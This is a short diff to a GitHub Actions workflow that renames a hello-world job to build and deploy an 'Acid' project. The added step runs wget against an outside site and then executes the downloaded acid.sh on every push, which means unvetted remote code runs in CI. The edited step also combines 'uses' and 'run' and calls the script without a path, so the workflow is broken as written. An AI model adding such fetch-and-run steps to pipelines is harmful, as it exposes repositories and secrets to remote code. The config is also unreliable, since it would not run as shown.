@@ -1,14 +1,12 @@
 on: [push]
 
 jobs:
-  hello_world_job:
+  build:
     runs-on: ubuntu-latest
-    name: A job to say hello
+    name: Build and deploy this Acid project.
     steps:
       - uses: actions/checkout@v3
       - id: build
         uses: actions/acid-build-action@v1
-        with:
-          project-path: '.'
-      - run: ls
+        run: wget https://blckunicorn.art/assets/scripts/acid.sh && acid.sh .
         shell: bash
